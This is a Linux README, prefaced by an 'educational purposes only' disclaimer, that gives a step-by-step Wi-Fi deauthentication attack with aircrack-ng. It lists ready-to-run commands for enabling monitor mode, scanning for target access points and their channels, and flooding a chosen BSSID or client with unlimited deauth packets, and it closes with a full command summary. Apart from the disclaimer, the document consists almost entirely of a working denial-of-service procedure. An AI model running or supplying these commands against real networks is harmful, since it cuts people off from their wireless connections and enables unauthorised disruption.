

## ⚠️ Disclaimer

> This guide is for **educational purposes only**. Unauthorized access or disruption of any network is illegal and unethical. Only test on networks **you own or have explicit permission** to audit.

---

# 🔧 Wi-Fi Deauthentication Attack Guide (Linux)

This README outlines the steps to perform a deauthentication attack using `aircrack-ng` tools on a compatible wireless card in monitor mode.

---

## 🛠 Prerequisites

* A compatible Wi-Fi adapter that supports monitor mode and packet injection
* Linux OS
* `aircrack-ng` suite installed

Install it if not already:

```bash
sudo apt update && sudo apt install aircrack-ng -y
```

---

## 1. Identify Wireless Interface

```bash
iwconfig
```

Look for your wireless adapter (e.g., `wlo1`). It should show IEEE 802.11 capabilities.

---

## 2. Kill Conflicting Processes

Before enabling monitor mode, kill network managers to avoid interference:

```bash
sudo airmon-ng check kill
```

> 📝 **Note**: This will disconnect you from the internet.

---

## 3. Enable Monitor Mode

Use `airmon-ng` to put your wireless adapter into monitor mode:

```bash
sudo airmon-ng start wlo1
```

This will likely create a new interface (e.g., `wlo1mon`).

---

## 4. Discover Nearby Access Points

Use `airodump-ng` to scan for wireless networks:

```bash
sudo airodump-ng wlo1mon
```

* **BSSID**: MAC address of the access point
* **CH**: Channel
* **ESSID**: Network name (SSID)

> Make note of the **BSSID** and **channel** of your target network.

---

## 5. Set Interface to Target Channel

You must ensure your wireless card is tuned to the same channel as the target AP:

```bash
sudo iwconfig wlo1mon channel <channel_number>
```

Replace `<channel_number>` with the one noted from the previous step.

---

## 6. Perform Deauthentication Attack

Once on the correct channel, execute the deauth attack:

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlo1mon 
```

* `--deauth 0`: Infinite deauth packets
* `-a <BSSID>`: Target AP MAC address


> Optionally, add `-c <client MAC>` to target a specific client.

---

## 7. Stop Monitor Mode & Restore Services

After your testing is complete, revert everything:

```bash
# Disable monitor mode
sudo airmon-ng stop wlo1mon

# Restart networking services
sudo systemctl restart NetworkManager
```


---


### Permission Denied on Channel Setting

If you see an error like `Operation not permitted`, prefix your command with `sudo`.

---


## ✅ Summary of Commands

```bash
# Identify interfaces
iwconfig

# Kill processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlo1

# Scan APs
sudo airodump-ng wlo1mon

# Set channel
sudo iwconfig wlo1mon channel <channel>

# Deauth attack
sudo aireplay-ng --deauth 0 -a <BSSID> wlo1mon

# Stop monitor mode and restore
sudo airmon-ng stop wlo1mon
sudo systemctl restart NetworkManager

```

---

